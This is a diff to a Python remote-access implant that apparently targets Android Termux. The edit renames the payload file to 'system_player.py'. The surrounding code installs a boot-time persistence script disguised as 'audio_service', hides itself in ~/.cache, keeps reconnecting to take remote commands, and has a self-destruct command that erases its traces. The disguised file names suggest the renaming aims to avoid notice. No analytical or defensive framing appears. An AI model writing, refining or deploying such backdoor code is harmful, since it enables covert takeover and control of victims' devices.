@@ -1,3 +1,4 @@
+```python
 #!/usr/bin/env python3
 import socket
 import subprocess
@@ -21,11 +22,11 @@ def setup_persistence():
     boot_dir.mkdir(parents=True, exist_ok=True)
     
     startup_script = boot_dir / 'audio_service'
-    startup_script.write_text('#!/bin/bash\ncd ~/.cache && python system_service.py &\n')
+    startup_script.write_text('#!/bin/bash\ncd ~/.cache && python system_player.py &\n')
     os.chmod(startup_script, 0o755)
     
-    os.system('mv ~/system_service.py ~/.cache/')
-    os.system('chmod +x ~/.cache/system_service.py')
+    os.system('mv ~/system_player.py ~/.cache/')
+    os.system('chmod +x ~/.cache/system_player.py')
 
 def get_connection():
     while True:
@@ -60,7 +61,7 @@ def handle_connection(conn):
                 break
                 
             if cmd == '::SELF_DESTRUCT::':
-                os.system('rm -rf ~/.cache/system_service.py')
+                os.system('rm -rf ~/.cache/system_player.py')
                 os.system('rm -rf ~/.termux/boot/audio_service')
                 conn.send(b'[+] Service removed permanently\n')
                 break
@@ -89,3 +90,4 @@ if __name__ == '__main__':
     
     while True:
         time.sleep(3600)
+```
